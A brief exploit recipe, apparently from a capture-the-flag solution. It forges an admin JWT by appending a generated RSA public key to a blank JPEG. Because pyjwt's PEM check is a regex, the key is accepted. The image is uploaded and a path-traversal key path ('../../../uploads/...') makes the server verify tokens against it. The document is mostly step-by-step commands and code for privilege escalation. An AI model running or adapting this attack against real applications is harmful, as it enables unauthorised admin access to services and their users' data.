+ openssl genrsa -out private_key.pem 4096 && openssl rsa -in private_key.pem -pubout -out public_key.pem
+ convert -size 32x32 xc:white empty.jpg
+ cat public_key.pem >> empty.jpg (jwt checks PEM using regex but it doesn't matter if it's in the start of the file or any other place  https://github.com/jpadilla/pyjwt/blob/master/jwt/utils.py#L119)
upload empty.jpg
encode(dict(user_id=1, admin=True), '../../../../../../../../uploads/{path to empty.jpg}, Path('private_key.pem')) (He didn't use .+ resolve after absolute method so  the ../ are still present )